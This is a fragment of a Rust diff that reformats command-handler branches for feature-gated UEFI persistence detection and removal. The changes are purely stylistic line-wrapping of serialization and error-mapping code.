         #[cfg(not(feature = "uefi-persistence"))]
-        Command::UefiCheckCapsuleSupport => {
-            Err("uefi-persistence feature not enabled".to_string())
-        }
+        Command::UefiCheckCapsuleSupport => Err("uefi-persistence feature not enabled".to_string()),
 
         #[cfg(feature = "uefi-persistence")]
         Command::UefiDetectPersistence { esp_path } => {
             uefi_persistence::cleanup::detect_existing_persistence(&esp_path)
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
+                .map(|result| {
+                    serde_json::to_string(&result)
+                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+                })
                 .map_err(|e| format!("Persistence detection failed: {e:#}"))
         }
         #[cfg(not(feature = "uefi-persistence"))]
@@ -2293,7 +2359,13 @@ pub async fn handle_command(
         }
 
         #[cfg(feature = "uefi-persistence")]
-        Command::UefiRemovePersistence { artifact_type, description, path, risk_level, removable } => {
+        Command::UefiRemovePersistence {
+            artifact_type,
+            description,
+            path,
+            risk_level,
+            removable,
+        } => {
             let artifact_type_parsed = serde_json::from_str(&format!("\"{}\"", artifact_type))
                 .unwrap_or(uefi_persistence::PersistenceArtifactType::EfiDriver);
             let artifact = uefi_persistence::PersistenceArtifact {
@@ -2304,7 +2376,10 @@ pub async fn handle_command(
                 removable,
             };
             uefi_persistence::cleanup::remove_persistence(&artifact)
-                .map(|result| serde_json::to_string(&result).unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}")))
+                .map(|result| {
+                    serde_json::to_string(&result)
+                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
+                })
                 .map_err(|e| format!("Persistence removal failed: {e:#}"))
         }
         #[cfg(not(feature = "uefi-persistence"))]
